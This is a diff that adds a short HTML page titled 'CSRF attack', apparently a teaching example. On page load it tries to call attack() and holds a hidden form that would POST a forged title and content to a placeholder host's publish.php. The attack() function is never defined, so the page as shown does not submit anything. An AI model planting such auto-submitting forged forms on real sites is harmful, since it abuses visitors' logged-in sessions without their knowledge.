@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>CSRF攻击</title>
+</head>
+
+<body onload="attack()">
+    　　<form method="POST" name="transfer" 　action="http://xxx.yyy.com/publish.php">
+        　　<input type="hidden" name="title" value="CSRF攻击的例子">
+        　　<input type="hidden" name="content" value="很快回家回家回家后">
+    　　</form>
+</body>
+
+</html>
